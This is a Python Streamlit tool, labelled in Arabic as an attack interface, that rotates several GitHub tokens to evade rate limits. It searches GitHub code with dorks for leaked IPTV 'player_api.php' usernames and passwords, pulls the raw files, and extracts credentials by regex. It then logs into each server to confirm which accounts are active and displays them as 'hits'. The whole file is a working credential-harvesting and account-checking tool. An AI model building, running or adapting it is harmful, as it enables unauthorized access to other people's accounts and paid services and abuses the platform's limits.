import streamlit as st
import requests
import re
import time
from datetime import datetime

# إعدادات الواجهة
st.set_page_config(page_title="BEAST V31 - MULTI-TOKEN", layout="wide")

# نظام الدخول
if "auth" not in st.session_state:
    st.session_state.auth = False

if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V31 - MULTI-TOKEN</h1>", unsafe_allow_html=True)
    pwd = st.text_input("Password:", type="password")
    if st.button("دخول"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

# تنسيق الألوان المطور
st.markdown("""
<style>
    .stApp { background-color: #000; }
    .scan-log { color: #00d4ff; font-family: monospace; font-size: 13px; margin: 0; padding: 2px; }
    .active-hit { 
        background: #0d1117; border: 1px solid #00ff41; 
        padding: 15px; border-radius: 8px; margin-bottom: 10px;
    }
    .text-green { color: #00ff41; font-weight: bold; }
    .text-yellow { color: #fbbf24; }
    .text-white { color: #fff; font-family: monospace; }
    .cat-box { 
        background: #1a1a1a; color: #888; font-size: 11px; 
        padding: 5px; border-radius: 4px; border: 1px solid #333; margin-top: 5px;
    }
</style>
""", unsafe_allow_html=True)

# الجانب الجانبي لإدخال التوكنات
with st.sidebar:
    st.title("⚡ BEAST V31")
    st.subheader("إعدادات الهجوم")
    # ميزة إضافة أكثر من توكن (ضع كل توكن في سطر)
    tokens_input = st.text_area("أدخل التوكنات (كل توكن في سطر):", height=150, placeholder="ghp_xxx...\nghp_yyy...")
    tokens = [t.strip() for t in tokens_input.split('\n') if t.strip()]
    
    start = st.button("🚀 ابدأ الهجوم المليوني")
    if tokens:
        st.success(f"تم تحميل {len(tokens)} توكنات.")
    else:
        st.warning("يرجى إدخال توكن واحد على الأقل.")

# مناطق العرض
st.subheader("📡 الرادار المباشر (فحص التوكنات والنتائج)")
status_area = st.empty()
radar_area = st.empty()

st.subheader("🏆 النتائج المكتشفة مع استعراض القوائم")
hits_container = st.container()

# المحرك الرئيسي
if start and tokens:
    # قائمة الدروكات الضخمة
    dorks = [
        'extension:txt "get.php?username=" "password="', 
        'extension:m3u "player_api.php"',
        'extension:php "panel_api.php" username password',
        '"http://" "username=" "password=" "port" extension:txt',
        'extension:json "server_url" "username"',
        'extension:m3u8 "username=" "password="'
    ]
    
    found_count = 0
    token_index = 0
    
    for dork in dorks:
        for page in range(1, 21):
            # نظام تبديل التوكنات الذكي
            current_token = tokens[token_index % len(tokens)]
            headers = {'Authorization': f'token {current_token}', 'Accept': 'application/vnd.github.v3+json'}
            
            try:
                status_area.info(f"استخدام التوكن رقم { (token_index % len(tokens)) + 1} | البحث عن: {dork} | صفحة: {page}")
                search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=50"
                res = requests.get(search_url, headers=headers).json()
                
                # التحقق من الحظر للتوكن الحالي
                if "items" not in res:
                    token_index += 1 # الانتقال للتوكن التالي فوراً
                    status_area.error(f"التوكن الحالي وصل للحد الأقصى. يتم التبديل للتوكن التالي...")
                    time.sleep(2)
                    continue

                for item in res['items']:
                    raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                    try:
                        content = requests.get(raw_url, timeout=3).text
                        matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                        
                        for m in matches:
                            host, user, pw = m[0], m[1], m[2]
                            radar_area.markdown(f"<p class='scan-log'>🔍 Checking: {host}...</p>", unsafe_allow_html=True)
                            
                            try:
                                api_base = f"{host}/player_api.php?username={user}&password={pw}"
                                r = requests.get(api_base, timeout=2).json()
                                
                                if r.get("user_info", {}).get("status") == "Active":
                                    # جلب عينة من القوائم (Categories)
                                    cat_res = requests.get(f"{api_base}&action=get_live_categories", timeout=2).json()
                                    cat_names = [c.get('category_name') for c in cat_res[:10]] if isinstance(cat_res, list) else ["لا يوجد تصنيفات"]
                                    
                                    found_count += 1
                                    with hits_container:
                                        st.markdown(f"""
                                        <div class="active-hit">
                                            <span class="text-green">✅ HIT #{found_count} - {host}</span><br>
                                            <span class="text-white">USER: {user} | PASS: {pw}</span><br>
                                            <div class="cat-box">
                                                <b>📁 عينة من القوائم:</b> {' | '.join(cat_names)}...
                                            </div>
                                        </div>
                                        """, unsafe_allow_html=True)
                            except: continue
                    except: continue
            except Exception as e:
                token_index += 1
                continue
